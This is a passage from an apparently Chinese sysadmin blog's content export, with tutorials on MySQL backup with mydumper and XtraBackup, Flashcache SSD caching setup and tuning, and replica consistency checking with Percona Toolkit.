class="line">-V, --version                     显示版本</div><div class="line">-v, --verbose                     输出模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为2&lt;/pre&gt;</div></pre></td></tr></table></figure>
<h4 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.导出test库下面的table1和table2表结构和数据</div><div class="line">/usr/local/bin/mydumper  -h 10.1.1.1 -u root -p root -B test1 -T table1,table2  -t 8 -r 100000 -c --less-locking  -v 3 -D -L /var/log/mydumper.log   -o /geekwolf/test_table1_table2/</div><div class="line">若只导出数据增加-m参数</div><div class="line">2.将导出的数据导入到10.1.1.2服务器的test2库中</div><div class="line">/usr/local/bin/myloader   -h 10.1.1.2 -u root -p root  -B test2 -e -t 8  -d /geekwolf/test_table1_table2/ --overwrite-tables -v 3&lt;/pre&gt;</div><div class="line">**注释**:后台记录导出导入的时间</div><div class="line">输入screen命令</div><div class="line">然后(time myloader   -h 10.1.1.2 -u user  -p &apos;ap&apos; -B mnew_gz -e -t 8  -d /geekwolf/m_members/ --overwrite-tables -v 3) 2&gt;/geekwolf/im.log</div><div class="line">最后Ctrl+A+D</div></pre></td></tr></table></figure>
<p>最后其他备份工具如:mysqldump/mysqlhotcopy/MySQLDumper 、mk-parallel-dump/mk-parallel-restore 、Xtrabackup/LVM Snapshot 暂时想到这么多，以后再想到再补充吧，也欢迎各位大拿fork工具库提交 <a href="https://github.com/geekwolf/sa-scripts/blob/master/devops.md%20" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/devops.md </a></p>
<h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><blockquote>
<p><a href="http://my.oschina.net/anthonyyau/blog/299794" target="_blank" rel="external">http://my.oschina.net/anthonyyau/blog/299794</a><br><a href="http://www.tuicool.com/articles/BvUBVv" target="_blank" rel="external">http://www.tuicool.com/articles/BvUBVv</a><br><a href="http://centminmod.com/mydumper.html" target="_blank" rel="external">http://centminmod.com/mydumper.html</a><br><a href="http://www.cnblogs.com/linuxnote/p/3817698.html" target="_blank" rel="external">http://www.cnblogs.com/linuxnote/p/3817698.html</a><br><a href="https://launchpad.net/mydumper" target="_blank" rel="external">https://launchpad.net/mydumper</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mydumper </tag>
            
            <tag> MySQL备份 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ansible学习笔记]]></title>
      <url>/2014/12/05/ansible-handbook.html</url>
      <content type="html"><![CDATA[<p><a href="http://blog.simlinux.com/books/Ansible-notes.pdf" title="Ansible学习笔记" target="_blank" rel="external">Ansible学习笔记</a> <a href="http://blog.simlinux.com/books/Ansible-notes.pdf" target="_blank" rel="external">http://blog.simlinux.com/books/Ansible-notes.pdf</a></p>
<p>目前只包含Ansible基础使用，下载后可以看到目录便于查看，后续会根据生产使用增加实战内容！</p>
]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Ansible </tag>
            
            <tag> Ansible中文手册 </tag>
            
            <tag> Ansible自动化运维 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Flashcache基本使用及注意事项]]></title>
      <url>/2014/11/06/mysql-flashcache.html</url>
      <content type="html"><![CDATA[<p><strong>环境：</strong>Centos6.5 x64 minal</p>
<h4 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h4><p>1.rpm安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rpm --import http://elrepo.org/RPM-GPG-KEY-elrepo.org</div><div class="line">rpm -Uvh http://elrepo.org/elrepo-release-6-5.el6.elrepo.noarch.rpm</div><div class="line">yum install flashcache-utils kmod-flashcache</div></pre></td></tr></table></figure></p>
<p>2.源码安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">rpm -ivh http://mirrors.ustc.edu.cn/centos/6.5/os/x86_64/Packages/kernel-headers-2.6.32-431.el6.x86_64.rpm</div><div class="line">rpm -ivh http://mirrors.ustc.edu.cn/centos/6.5/os/x86_64/Packages/kernel-devel-2.6.32-431.el6.x86_64.rpm</div><div class="line">wget https://github.com/facebook/flashcache/archive/3.1.2.tar.gz</div><div class="line">tar xf 3.1.2.tar.gz</div><div class="line">cd flashcache-3.1.2</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure></p>
<h4 id="自动加载模块"><a href="#自动加载模块" class="headerlink" title="自动加载模块"></a>自动加载模块</h4><p>开机自动加载模块配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysconfig/modules/flashcache.modules</div><div class="line">#! /bin/sh</div><div class="line">/sbin/modinfo -F filename flashcache &gt; /dev/null 2&gt;&amp;1 </div><div class="line">if [ $? -eq 0 ]; then</div><div class="line">    /sbin/modprobe flashcache</div><div class="line">fi </div><div class="line">chmod +x  /etc/sysconfig/modules/flashcache.modules</div></pre></td></tr></table></figure></p>
<p>模块的自动加载最好不要采用写入/etc/rc.local的方式</p>
<h4 id="加载flashcache模块"><a href="#加载flashcache模块" class="headerlink" title="加载flashcache模块"></a>加载flashcache模块</h4><p><code>modprobe flashcache</code>                   </p>
<h4 id="查看flashcache模块是否加载"><a href="#查看flashcache模块是否加载" class="headerlink" title="查看flashcache模块是否加载"></a>查看flashcache模块是否加载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# lsmod |grep flashcache </div><div class="line">flashcache 92068 0 </div><div class="line">dm_mod 84209 14 flashcache,dm_mirror,dm_log</div></pre></td></tr></table></figure>
<h4 id="删除flashcache模块"><a href="#删除flashcache模块" class="headerlink" title="删除flashcache模块"></a>删除flashcache模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rmmod flashcache</div></pre></td></tr></table></figure>
<h4 id="创建Flashcache"><a href="#创建Flashcache" class="headerlink" title="创建Flashcache"></a>创建Flashcache</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">SSD:/dev/sdc</div><div class="line">SAS:/dev/sdb2</div><div class="line">创建设备名为cachedev的flashcache</div><div class="line">flashcache_create -p back -b 4k cachedev /dev/sdc /dev/sdb2</div><div class="line">生成/dev/mapper/cachedev设备</div><div class="line">指定flashcache的block大小与Percona的page大小相同,一般默认</div></pre></td></tr></table></figure>
<p><strong>flashcache_create相关参数说明：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-p:缓存模式 writeback(数据先写到SSD，随后写到普通硬盘)，</div><div class="line">            writethrough(数据同时写到SSD和普通硬盘)，</div><div class="line">            writearound（数据绕过SSD，直接写到普通硬盘）三种，三种模式的所有读都会被缓存到flashcache可以通过dev.flashcache.&lt;cachedev&gt;.cache_all参数调整</div><div class="line">-s：缓存大小，可选项，如果未指定则整个SSD设备被用于缓存，默认的计数单位是扇区（sectors）,但是可以接受k/m/g单位。</div><div class="line">-b：指定块大小，可选项，默认为4KB，必须为2的指数。默认单位为扇区。也可以用K作为单位，一般选4KB。</div><div class="line">-f：强制创建，不进行检查</div><div class="line">-m：设备元数据块大小，只有writeback需要存储metadata块，默认4K</div></pre></td></tr></table></figure></p>
<p><strong>查看帮助</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# flashcache_create</div><div class="line">Usage: flashcache_create [-v] [-p back|thru|around] [-b block size] [-m md block size] [-s cache size] [-a associativity] cachedev ssd_devname disk_devname</div><div class="line">Usage : flashcache_create Cache Mode back|thru|around is required argument</div><div class="line">Usage : flashcache_create Default units for -b, -m, -s are sectors, or specify in k/M/G. Default associativity is 512</div></pre></td></tr></table></figure></p>
<p>其他帮助参考flashcache源码目录下的man目录</p>
<h4 id="加载缓存设备"><a href="#加载缓存设备" class="headerlink" title="加载缓存设备"></a><strong>加载缓存设备</strong></h4><p>flashcache_load /dev/sdc  cachedev (系统重启时使用来加载已经创建过的缓存设备cachedev<br>加载已存在的flashcache操作仅用于writeback模式，writethrough和writearound模式重启机器后需要重新使用flashcache_create创建</p>
<h4 id="使用Flashcache"><a href="#使用Flashcache" class="headerlink" title="使用Flashcache"></a><strong>使用Flashcache</strong></h4><p>创建好的flashcache设备是块设备，可格式文件系统后挂在使用,也可以继续对其分区等<br><code>mount /dev/mapper/cachedev /data</code></p>
<h4 id="销毁Flashcache"><a href="#销毁Flashcache" class="headerlink" title="销毁Flashcache"></a><strong>销毁Flashcache</strong></h4><p><code>flashcache_destroy /dev/sdc</code></p>
<p>这种方式删除writeback模式的flashcache时会将SSD上的所有数据删除包括脏数据<br>建议使用dmsetup命令（device-mapper软件包）删除，会自动将脏数据写入磁盘<br>dmsetup remove cachedev</p>
<h4 id="Flashcache参数优化"><a href="#Flashcache参数优化" class="headerlink" title="Flashcache参数优化"></a><strong>Flashcache参数优化</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">[root@localhost ]#sysctl dev.flashcache</div><div class="line">dev.flashcache.sdc+sdb2.io_latency_hist = 0</div><div class="line">dev.flashcache.sdc+sdb2.do_sync = 0</div><div class="line">dev.flashcache.sdc+sdb2.stop_sync = 0</div><div class="line">dev.flashcache.sdc+sdb2.dirty_thresh_pct = 20</div><div class="line">dev.flashcache.sdc+sdb2.max_clean_ios_total = 4</div><div class="line">dev.flashcache.sdc+sdb2.max_clean_ios_set = 2</div><div class="line">dev.flashcache.sdc+sdb2.do_pid_expiry = 0</div><div class="line">dev.flashcache.sdc+sdb2.max_pids = 100</div><div class="line">dev.flashcache.sdc+sdb2.pid_expiry_secs = 60</div><div class="line">dev.flashcache.sdc+sdb2.reclaim_policy = 0</div><div class="line">dev.flashcache.sdc+sdb2.zero_stats = 0</div><div class="line">dev.flashcache.sdc+sdb2.fast_remove = 0</div><div class="line">dev.flashcache.sdc+sdb2.cache_all = 1</div><div class="line">dev.flashcache.sdc+sdb2.fallow_clean_speed = 2</div><div class="line">dev.flashcache.sdc+sdb2.fallow_delay = 900</div><div class="line">dev.flashcache.sdc+sdb2.skip_seq_thresh_kb = 0</div><div class="line">dev.flashcache.sdc+sdb2.clean_on_read_miss = 0</div><div class="line">dev.flashcache.sdc+sdb2.clean_on_write_miss = 0</div><div class="line">dev.flashcache.sdc+sdb2.lru_promote_thresh = 2</div><div class="line">dev.flashcache.sdc+sdb2.lru_hot_pct = 75</div><div class="line">dev.flashcache.sdc+sdb2.new_style_write_merge = 0</div></pre></td></tr></table></figure>
<p><strong>参数介绍参考：</strong><a href="https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt" target="_blank" rel="external">https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt</a></p>
<p>针对MySQL作此优化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">dev.flashcache.sdc+sdb2.cache_all = 1   默认值1表示缓存所有，0都不缓存，另外通过进程黑白名单控制</div><div class="line">dev.flashcache.sdc+sdb2.reclaim_policy = 1  缓存回收策略，0：FIFO，1：LRU，可动态调整</div><div class="line">dev.flashcache.sdbc+sdb2.fast_remove = 1  0表示不同步脏块到磁盘，1表示同步脏块到磁盘</div><div class="line">dev.flashcache.sdc+sdb2.dirty_thresh_pct = 90  每组脏块占有的百分比，过低会减少块覆盖，增加磁盘写操作和读缓存</div><div class="line">dev.flashcache.sdc+sdb2.new_style_write_merge = 1 打开写入合并，提升写磁盘的性能(旧版本dev.flashcache.sdc+sdb2.write_merge)</div><div class="line">dev.flashcache.sdb1+sda6.skip_seq_thresh_kb = 256  表示不缓存超过256kb的顺序IO(由于SSD的随机读写比SAS好，但顺序读写相差不大，故作此优化)&lt;/pre&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Flashcache开机启动"><a href="#Flashcache开机启动" class="headerlink" title="Flashcache开机启动"></a><strong>Flashcache开机启动</strong></h4><p>flashcache模块自动加载–flashcache设备自动加载flashcache_load /dev/sdc  cachedev</p>
<p>A.模块自动加载请参考安装部分</p>
<p>B.开机自动加载已创建的缓存设备及挂载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">cd /usr/src/flashcache-3.1.2/utils</div><div class="line">cp flashcache /etc/init.d/</div><div class="line">chmod +x /etc/init.d/flashcache </div><div class="line">修改/etc/init.d/flashcache</div><div class="line">SSD_DISK= /dev/sdc</div><div class="line">BACKEND_DISK= /dev/sdb2</div><div class="line">CACHEDEV_NAME= cachedev</div><div class="line">MOUNTPOINT= /data</div><div class="line">FLASHCACHE_NAME=sdc+sdb2</div><div class="line">chkconfig flashcache on</div></pre></td></tr></table></figure></p>
<h4 id="Flashcache状态监控"><a href="#Flashcache状态监控" class="headerlink" title="Flashcache状态监控"></a><strong>Flashcache状态监控</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">dmsetup status cachedev</div><div class="line">dmsetup table  cachedev</div><div class="line">错误日志报告 </div><div class="line">/proc/flashcache/sdc+sdb2/flashcache_errors</div><div class="line"></div><div class="line">状态报告</div><div class="line">/proc/flashcache/sdc+sdb2/flashcache_stats</div><div class="line">亦可使用flashstat命令实时查看</div></pre></td></tr></table></figure>
<p>到此flashcache的基本使用就是这样，看了网上很多资料都是各种抄袭，不凡错误的，最后还是读了官方的帮助，总结出自己的以便以后使用；</p>
<p>后续要做的就是增加了SSD缓存后，要观察SSD的使用情况及缓存命中率等在逐渐调试优化，下一篇增加MySQL数据库从系统/MySQL方面的一些优化总结和大家分享，请继续关注</p>
<p><strong>推荐IO测试工具</strong></p>
<p>fio、iozone 更多参考<a href="https://github.com/geekwolf/sa-scripts/blob/master/devops.md" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/devops.md</a></p>
<p><strong>注意事项：</strong></p>
<p>flashcache_create创建了缓存设备之后挂载即可使用，如创建之后使用flashcache_load /dev/sdc  cachedev会提示Invalid Flashcache superblock的错误</p>
<p><strong>参考文档</strong></p>
<blockquote>
<p><a href="http://blog.163.com/digoal%40126/blog/static/163877040201463101652528/" target="_blank" rel="external">http://blog.163.com/digoal%40126/blog/static/163877040201463101652528/</a></p>
<p><a href="https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt" target="_blank" rel="external">https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> flashcache </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[主从一致性检查和修复]]></title>
      <url>/2014/10/30/mysql-rep-checksum.html</url>
      <content type="html"><![CDATA[<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">主： 192.168.1.96</div><div class="line">从： 192.168.1.68</div></pre></td></tr></table></figure>
<h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><h5 id="授权主从一致性检查和同步账号"><a href="#授权主从一致性检查和同步账号" class="headerlink" title="授权主从一致性检查和同步账号"></a>授权主从一致性检查和同步账号</h5><p>主库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; GRANT update,insert,delete,SELECT,PROCESS, SUPER, REPLICATION SLAVE ON *.* TO &apos;geekwolf&apos;@&apos;192.168.1.%&apos; IDENTIFIED BY &apos;geekwolf&apos;;</div><div class="line">mysql&gt; flush privileges;</div></pre></td></tr></table></figure>
<h5 id="创建检查信息表和dsns从库连接信息表（此处创建在test库）"><a href="#创建检查信息表和dsns从库连接信息表（此处创建在test库）" class="headerlink" title="创建检查信息表和dsns从库连接信息表（此处创建在test库）"></a>创建检查信息表和dsns从库连接信息表（此处创建在test库）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE TABLE checksums (</div><div class="line">   db             char(64)     NOT NULL,</div><div class="line">   tbl            char(64)     NOT NULL,</div><div class="line">   chunk          int          NOT NULL,</div><div class="line">   chunk_time     float            NULL,</div><div class="line">   chunk_index    varchar(200)     NULL,</div><div class="line">   lower_boundary text             NULL,</div><div class="line">   upper_boundary text             NULL,</div><div class="line">   this_crc       char(40)     NOT NULL,</div><div class="line">   this_cnt       int          NOT NULL,</div><div class="line">   master_crc     char(40)         NULL,</div><div class="line">   master_cnt     int              NULL,</div><div class="line">   ts             timestamp    NOT NULL,</div><div class="line">   PRIMARY KEY (db, tbl, chunk),</div><div class="line">   INDEX ts_db_tbl (ts, db, tbl)</div><div class="line">) ENGINE=InnoDB;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE TABLE `dsns` (</div><div class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</div><div class="line">  `parent_id` int(11) DEFAULT NULL,</div><div class="line">  `dsn` varchar(255) NOT NULL,</div><div class="line">  PRIMARY KEY (`id`)</div><div class="line">);</div></pre></td></tr></table></figure>
<h5 id="插入从库连接信息"><a href="#插入从库连接信息" class="headerlink" title="插入从库连接信息"></a>插入从库连接信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into dsns values(1,1,&apos;192.168.1.68,u=geekwolf,p=geekwolf,P=3306&apos;);</div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>主库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; use test</div><div class="line"> mysql&gt; create table now(id int,name vachar(10));</div><div class="line"> mysql&gt; nsert into now values(1,&apos;terry&apos;),(2,&apos;honey&apos;),(3,&apos;geekwolf&apos;);</div></pre></td></tr></table></figure></p>
<p>从库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update test.now set name=&apos;john&apos; where id=1;</div><div class="line"> mysql&gt; delete  from test.now where id=2;</div><div class="line"> mysql&gt; insert  into test.now values(4,&apos;test&apos;);</div></pre></td></tr></table></figure></p>
<h5 id="检查库test数据是否一致并修复"><a href="#检查库test数据是否一致并修复" class="headerlink" title="检查库test数据是否一致并修复"></a>检查库test数据是否一致并修复</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@master ~]# pt-table-checksum h=&apos;192.168.1.96&apos;,u=&apos;geekwolf&apos;,p=&apos;geekwolf&apos;,P=3306 --databases test --nocheck-replication-filters --replicate=test.checksums --no-check-binlog-format </div><div class="line">Cannot connect to P=3306,h=192.168.1.78,p=...,u=geekwolf </div><div class="line">TS ERRORS DIFFS ROWS CHUNKS SKIPPED TIME TABLE </div><div class="line">10-30T14:56:32 0 0 1 1 0 0.015 test.dsns </div><div class="line">10-30T14:56:32 0 0 0 1 0 0.019 test.keyword_setting </div><div class="line">10-30T14:56:32 0 1 3 1 0 0.014 test.now </div><div class="line">10-30T14:56:32 0 0 0 1 0 0.020 test.searchkeyword </div><div class="line">10-30T14:56:32 0 0 0 1 0 0.012 test.sms</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">TS ：完成检查的时间</div><div class="line">ERRORS ：检查时候发生错误和警告的数量</div><div class="line">DIFFS ：0表示一致，1表示不一致。当指定–no-replicate-check时，会一直为0，当指定–replicate-check-only会显示不同的信息</div><div class="line">ROWS ：表的行数</div><div class="line">CHUNKS ：被划分到表中的块的数目</div><div class="line">SKIPPED ：由于错误或警告或过大，则跳过块的数目</div><div class="line">TIME ：执行的时间</div><div class="line">TABLE ：被检查的表名</div></pre></td></tr></table></figure>
<p><strong>注释</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">--check-replication-filters 检查复制中是否设置了过滤条件，如果设置了，程序将退出;可以使用--no-check-replication-filters禁用</div><div class="line">--no-check-binlog-format 不对binlog的格式进行检查</div><div class="line">--replicate-check-only  只显示主从不一致部分,此参数不会生成新的checksums数据，只会根据checksums表已经有的数据来显示</div><div class="line">--databases test   指定检查的库，多库用逗号隔开</div><div class="line">--tables    now    指定检查的表</div><div class="line">--no-check-binlog-format 不对binlog的格式进行检查</div><div class="line">具体主从一致性检查涉及影响性能的参数：--max-load、--chunk-size、--chunk-size-limit等参考官网介绍</div><div class="line">http://www.percona.com/doc/percona-toolkit/2.1/pt-table-checksum.html</div></pre></td></tr></table></figure></p>
<h5 id="将主库一致性同步到从库"><a href="#将主库一致性同步到从库" class="headerlink" title="将主库一致性同步到从库"></a>将主库一致性同步到从库</h5><p>将从库192.168.1.68的test库的now表与主库192.168.1.96同步，并打印出相关SQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@master ~]# pt-table-sync --replicate=test.checksums --databases=test --tables=now h=192.168.1.96,P=3306,u=geekwolf,p=geekwolf h=192.168.1.68,P=3306,u=geekwolf,p=geekwolf --execute --print</div><div class="line"></div><div class="line">REPLACE INTO `test`.`now`(`id`, `name`) VALUES (&apos;1&apos;, &apos;terry&apos;) /*percona-toolkit src_db:test src_tbl:now src_dsn:P=3306,h=192.168.1.96,p=...,u=geekwolf dst_db:test dst_tbl:now dst_dsn:P=3306,h=192.168.1.68,p=...,u=geekwolf lock:1 transaction:1 changing_src:test.checksums replicate:test.checksums bidirectional:0 pid:7279 user:root host:master*/;</div><div class="line">REPLACE INTO `test`.`now`(`id`, `name`) VALUES (&apos;2&apos;, &apos;honey&apos;) /*percona-toolkit src_db:test src_tbl:now src_dsn:P=3306,h=192.168.1.96,p=...,u=geekwolf dst_db:test dst_tbl:now dst_dsn:P=3306,h=192.168.1.68,p=...,u=geekwolf lock:1 transaction:1 changing_src:test.checksums replicate:test.checksums bidirectional:0 pid:7279 user:root host:master*/;</div><div class="line">DELETE FROM `test`.`now` WHERE `id`=&apos;4&apos; LIMIT 1 /*percona-toolkit src_db:test src_tbl:now src_dsn:P=3306,h=192.168.1.96,p=...,u=geekwolf dst_db:test dst_tbl:now dst_dsn:P=3306,h=192.168.1.68,p=...,u=geekwolf lock:1 transaction:1 changing_src:test.checksums replicate:test.checksums bidirectional:0 pid:7282 user:root host:master*/;</div></pre></td></tr></table></figure></p>
<p>另外,只显示同步时要进行的SQL操作，并不执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pt-table-sync --print --sync-to-master --databases test h=192.168.1.68,P=3306,u=geekwolf,p=geekwolf</div></pre></td></tr></table></figure></p>
<p><strong>注意：</strong><br>      在规范的操作中，从库是要做只读操作的（set global read_only=1  或者my.cnf添加read_only=1 只对普通用户有效）；但如果从库做了写操作造成的数据差异，在主库上同步数据时会和主库保持一致，从库多余的会被删除，变化的会被更新，没有的会被插入，通过上面的命令就可以看到相关的SQL操作</p>
<h4 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a>推荐工具</h4><blockquote>
<p><a href="http://www.percona.com/doc/percona-toolkit/2.2/" target="_blank" rel="external">Percona-toolkit</a><br><a href="http://www.maatkit.org/" target="_blank" rel="external">Maatkit</a></p>
</blockquote>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p>pt-table-checksum原理分析 <a href="http://nettedfish.sinaapp.com/blog/2013/06/04/check-replication-consistency-by-pt-table-checksum/" target="_blank" rel="external">http://nettedfish.sinaapp.com/blog/2013/06/04/check-replication-consistency-by-pt-table-checksum/</a><br><a href="http://www.cnblogs.com/zhoujinyi/archive/2013/05/09/3067045.html" target="_blank" rel="external">http://www.cnblogs.com/zhoujinyi/archive/2013/05/09/3067045.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pt-table-checksum </tag>
            
            <tag> pt-table-sync </tag>
            
            <tag> 主从一致性检查修复 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[利用Percona XtraBackup进行单表备份恢复]]></title>
      <url>/2014/09/13/percona-xtrabackup-info.html</url>
      <content type="html"><![CDATA[<p>大部分情况下，使用用Percona XtraBackup进行整库的备份和恢复比较容易，此处略去；<br>对于单表的恢复略有不同，而且对数据库版本和Percona XtraBackup的版本都有限制<br><strong>局限性：</strong><br>1.源库MySQL版本无要求，但启用了innodb_file_per_table=1<br>2.目的库开启innodb_file_per_table=1，Percona XtraDB或者MySQL5.6<br>官方要求开启下面的两个参数，但发现5.6没有这样的变量，没去修改：innodb_expand_import=1（大于5.5.10-20.1版本）或innodb_import_table_from_xtrabackup=1（小于5.5.10-20.1版本）选项</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/09/qy.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/09/qy.png" alt="qy"></a></p>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">源库 ：Percona-Server-5.5.28-rel29.3-388</div><div class="line">目的库：Percona-Server-5.6.16-rel64.2-569</div><div class="line">备份工具 : percona-xtrabackup-2.2.4-5004</div></pre></td></tr></table></figure>
<h4 id="备份恢复步骤"><a href="#备份恢复步骤" class="headerlink" title="备份恢复步骤"></a>备份恢复步骤</h4><h5 id="备份表"><a href="#备份表" class="headerlink" title="备份表"></a>备份表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">innobackupex --user=root --password=simlinux.com   --defaults-file=/etc/my.cnf --include=&apos;se.searchaccount&apos; --slave-info --safe-slave-backup --stream=tar /data/backup &gt; /data/backup/searchaccount.tar.gz</div></pre></td></tr></table></figure>
